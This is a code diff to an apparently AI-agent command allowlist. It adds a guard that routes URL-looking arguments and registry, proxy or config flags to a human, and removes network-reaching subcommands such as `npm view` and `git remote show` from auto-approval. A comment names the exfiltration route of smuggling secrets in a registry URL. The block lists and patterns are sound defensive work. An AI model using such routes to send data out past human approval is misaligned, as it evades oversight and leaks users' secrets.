@@ -71,6 +71,13 @@ const onlyFlags = (allowed: string[]) => (args: string[]) => args.every((arg) =>
 const versionOnly = (args: string[]) => args.length === 1 && ["--version", "-v", "-V", "version"].includes(args[0]!);
 const firstIs = (allowed: string[]) => (args: string[]) => args.length > 0 && allowed.includes(args[0]!);
 const noneOf = (blocked: string[]) => (args: string[]) => !args.some((arg) => blocked.some((bad) => arg === bad || arg.startsWith(`${bad}=`)));
+/**
+ * Programs that can reach the network must not receive a destination from the model:
+ * `npm view x --registry=https://host/<secret>` or `git remote show https://host/<secret>`
+ * would carry data out without a human. Any URL-looking argument falls back to a human.
+ */
+const noUrl = (args: string[]) => !args.some((arg) => /:\/\/|^[\w.-]+@[\w.-]+:/.test(arg) || /^--?(registry|userconfig|globalconfig|config-file|proxy|https-proxy)\b/i.test(arg));
+const offline = (rule: (args: string[]) => boolean) => (args: string[]) => noUrl(args) && rule(args);
 
 const GIT_READ = new Set(["status", "log", "diff", "show", "rev-parse", "ls-files", "ls-tree", "blame", "describe", "shortlog", "cat-file", "rev-list", "grep", "count-objects", "for-each-ref", "merge-base", "name-rev", "whatchanged"]);
 /** Subcommand options that run programs, open a pager or write files. */
@@ -85,7 +92,8 @@ function git(args: string[]): boolean {
   if (GIT_READ.has(sub)) return true;
   switch (sub) {
     case "branch": return rest.every((arg) => ["-a", "-r", "-v", "-vv", "--all", "--remotes", "--list", "--show-current", "--merged", "--no-merged", "--no-color"].includes(arg));
-    case "remote": return rest.length === 0 || (rest.length === 1 && rest[0] === "-v") || (["show", "get-url"].includes(rest[0]!) && rest.length <= 2);
+    // `remote show` contacts the remote (any URL given as its argument); `get-url` only reads config.
+    case "remote": return rest.length === 0 || (rest.length === 1 && rest[0] === "-v") || (rest[0] === "get-url" && rest.length <= 2);
     case "tag": return rest.length === 0 || ["-l", "--list"].includes(rest[0]!);
     case "config": return ["--get", "--get-all", "--get-regexp", "--list", "-l"].includes(rest[0] ?? "") && !rest.some((arg) => /^--(add|unset|replace-all|rename-section|remove-section|edit|file)/.test(arg) || arg === "-e" || arg === "-f");
     case "stash": return ["list", "show"].includes(rest[0] ?? "");
@@ -111,13 +119,14 @@ const RULES: Record<string, (args: string[]) => boolean> = {
   find: noneOf(["-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"]),
   rg: (args) => !args.some((arg) => arg.startsWith("--pre")),
   tree: (args) => !flags(args).some((arg) => arg === "-o" || arg.startsWith("--output")),
-  git,
+  git: offline(git),
   docker: (args) => ["ps", "images", "info", "version", "inspect", "--version"].includes(args[0] ?? "") ||
     (["system", "volume", "image", "container", "network", "builder"].includes(args[0] ?? "") && ["df", "ls", "inspect"].includes(args[1] ?? "")) ||
     (args[0] === "stats" && args.includes("--no-stream")),
-  brew: (args) => ["list", "ls", "info", "outdated", "deps", "leaves", "config", "--prefix", "--cache", "--version", "--cellar"].includes(args[0] ?? "") || (args[0] === "services" && args[1] === "list"),
-  npm: (args) => versionOnly(args) || ["ls", "list", "root", "prefix", "outdated", "view", "explain", "why"].includes(args[0] ?? "") || (args[0] === "config" && ["get", "list", "ls"].includes(args[1] ?? "")) || (args[0] === "cache" && args[1] === "ls"),
-  pnpm: (args) => versionOnly(args) || ["ls", "list", "root", "outdated", "why"].includes(args[0] ?? "") || (args[0] === "store" && args[1] === "path"),
+  brew: offline((args) => ["list", "ls", "info", "outdated", "deps", "leaves", "config", "--prefix", "--cache", "--version", "--cellar"].includes(args[0] ?? "") || (args[0] === "services" && args[1] === "list")),
+  // Local-only subcommands: `view` and `outdated` query a registry, which a flag can redirect.
+  npm: offline((args) => versionOnly(args) || ["ls", "list", "root", "prefix", "explain", "why"].includes(args[0] ?? "") || (args[0] === "config" && ["get", "list", "ls"].includes(args[1] ?? "")) || (args[0] === "cache" && args[1] === "ls")),
+  pnpm: offline((args) => versionOnly(args) || ["ls", "list", "root", "why"].includes(args[0] ?? "") || (args[0] === "store" && args[1] === "path")),
   diskutil: (args) => ["list", "info"].includes(args[0] ?? "") || (args[0] === "apfs" && args[1] === "list"),
   launchctl: firstIs(["list", "print", "print-disabled"]),
   defaults: (args) => ["read", "read-type", "domains", "find"].includes(args[0] ?? ""),
